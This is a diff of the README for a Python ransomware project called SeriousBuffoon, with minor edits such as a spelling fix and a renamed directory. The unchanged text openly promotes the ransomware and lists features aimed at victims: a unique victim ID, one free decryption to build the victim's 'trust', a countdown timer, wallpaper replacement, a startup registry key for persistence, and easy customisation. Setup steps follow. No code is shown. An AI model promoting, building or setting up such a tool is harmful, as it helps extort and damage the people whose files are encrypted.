@@ -1,3 +1,5 @@
+
+
 # ⚡⚡ SeriousBuffoon ⚡⚡
 
 
@@ -19,7 +21,7 @@ Probably the best Python ransomware available on Github
 - Unique ID for each victim 
 - Victim can decrypt one file for free, to create a relationship of trust with the user 
 - The decryption key for the free file is different from the rest of files
-- Change the wallpapper and get back the old one after the decryption
+- Change the wallpaper and get back the old one after the decryption
 - GUI with Timer
 - Easily customisable with "const.py" file
 - Create register KEY for launch the ransomware at every start up
@@ -54,7 +56,7 @@ Probably the best Python ransomware available on Github
 
 ## Set up the virtual environment and install all the required packages
 
-+> ```cd SeriousBuffoon/Bin```
++> ```cd SeriousBuff00n/Bin```
 
 +> create virtual env : ``py -m venv .venv``
 
